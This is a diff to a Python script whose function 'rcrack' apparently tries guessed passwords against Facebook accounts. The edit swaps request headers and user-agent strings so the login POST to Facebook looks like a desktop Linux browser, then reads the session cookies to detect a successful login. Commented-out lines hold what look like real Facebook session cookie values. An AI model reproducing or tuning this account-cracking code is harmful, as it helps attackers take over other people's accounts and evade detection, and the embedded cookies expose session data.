@@ -460,7 +460,7 @@ def rcrack(uid,pwx,tl):
 
 			"login":"Log In"}
 
-			header_freefb = {'authority': 'mbasic.facebook.com',
+			header_freefb = {'authority': 'web.facebook.com',
 
             'method':'GET',
 
@@ -474,13 +474,11 @@ def rcrack(uid,pwx,tl):
 
             'cache-control': 'max-age=0',
 
-           # 'cookie': 'datr=FTDCYyCqu477lU3NRQp8WGAf; sb=FTDCY_h7AlexxAOADLgy-YHf; m_pixel_ratio=2.4750001430511475; dpr=2.4750001430511475; wd=437x835; dnonce=AWkKm5OmGUIvpunC_Ei4re3YFaReYBjyLohi86_juddO32wgnBGQzcByROCHV8MDm51p7XHh9t0JXOGLfkV74bfg; fr=0RKHf4KsmK9phtP1P..BjwjAV.SA.AAA.0.0.BjwjFY.AWXEIkcT7n0',
+            # 'cookie': 'datr=X4nCYzUNm42s8VoAmwVISJIL; sb=X4nCY7J-ZS9RRTEl2046fmri; dpr=2.4750001430511475; fr=0G5DHrfcH504g8zYb..Bjwolf.5h.AAA.0.0.Bjwomd.AWU5Ctrn3N4; wd=980x1872',
 
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',            'sec-ch-ua-mobile': '?0',
 
-            'sec-ch-ua-mobile': '?1',
-
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform': '"Linux"',
 
             'sec-fetch-dest': 'document',
 
@@ -492,8 +490,7 @@ def rcrack(uid,pwx,tl):
 
             'upgrade-insecure-requests': '1',
 
-            'user-agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920)',}
-
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',}
 			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 
 			log_cookies=session.cookies.get_dict().keys()
